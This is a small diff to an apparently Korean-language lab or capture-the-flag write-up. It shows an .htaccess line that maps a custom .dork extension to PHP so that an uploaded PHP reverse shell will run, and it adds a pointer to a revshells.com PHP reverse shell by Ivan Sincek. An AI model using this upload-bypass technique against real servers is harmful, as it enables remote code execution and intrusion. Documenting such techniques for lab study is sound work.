@@ -943,6 +943,8 @@ http://192.168.124.187 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ]
 
 # .htaccess로 확장자 허용 변경 후 php reverse shell을 .dork 확장자로 업로드
 echo "AddType application/x-httpd-php .dork" > .htaccess
+# https://www.revshells.com/
+php Ivan Sincek
 
 ```
 
